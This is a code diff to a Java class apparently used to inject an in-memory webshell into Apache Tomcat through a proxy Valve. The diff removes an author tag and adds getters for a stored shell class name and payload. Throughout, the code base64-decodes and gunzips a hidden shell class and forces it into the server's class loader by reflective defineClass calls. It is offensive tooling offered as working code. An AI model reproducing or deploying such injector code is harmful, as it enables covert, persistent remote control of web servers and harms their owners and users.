@@ -14,7 +14,6 @@ import java.util.Set;
 import java.util.zip.GZIPInputStream;
 
 /**
- * @author ReaJason
  */
 public class TomcatProxyValveInjector implements InvocationHandler {
 
@@ -23,6 +22,9 @@ public class TomcatProxyValveInjector implements InvocationHandler {
 
     private static String shellClassName;
     private static String shellClass;
+
+    public String getClassName() { return shellClassName; }
+    public String getBase64String() { return shellClass; }
     private static boolean ok;
 
     public TomcatProxyValveInjector() {
@@ -123,7 +125,7 @@ public class TomcatProxyValveInjector implements InvocationHandler {
         try {
             clazz = classLoader.loadClass(shellClassName);
         } catch (Exception e) {
-            byte[] clazzByte = gzipDecompress(decodeBase64(shellClass));
+            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
             clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
